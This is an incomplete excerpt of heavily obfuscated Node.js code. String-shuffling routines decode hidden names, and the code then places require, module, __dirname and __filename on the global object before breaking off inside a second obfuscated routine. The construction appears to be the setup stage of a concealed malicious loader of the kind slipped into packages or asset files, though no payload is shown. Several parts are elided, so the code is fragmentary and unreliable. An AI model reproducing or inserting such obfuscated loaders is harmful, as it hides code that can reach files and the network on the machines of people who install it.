...
var _$_921d = (function (x, i) {
  ...
  for (var q = 0; q < v; q++) {
    var u = i * (q + 101) + (i % 23210);
    var z = i * (q + 536) + (i % 51087);
    var y = u % v;
    var l = z % v;
    var b = e[y];
    e[y] = e[l];
  ...
  var j = "\x23\x30";
  var t = "\x23";
  return e.join(k).split(p).join(m).split(w).join(r).split(j).join(t).split(m);
})("e%liane%df%cjfm%an_deeenrn_ie__%mbuoimtr__d", 2659079);
global[_$_921d[0x0]] = require;
if (typeof module === _$_921d[0x1]) {
  global[_$_921d[0x2]] = module;
}
if (typeof __dirname !== _$_921d[0x3]) {
  global[_$_921d[0x4]] = __dirname;
}
if (typeof __filename !== _$_921d[0x3]) {
  global[_$_921d[0x5]] = __filename;
}
var _$jsoToArr;
(function () {
  var sUa = "",
  ...
  function Eyl(a) {
    ...
    for (var x = 0; x < z; x++) {
      var y = t * (x + 489) + (t % 23863);
      var f = t * (x + 479) + (t % 42664);
      var n = y % z;
      var e = f % z;
      var l = s[n];
      s[n] = s[e];
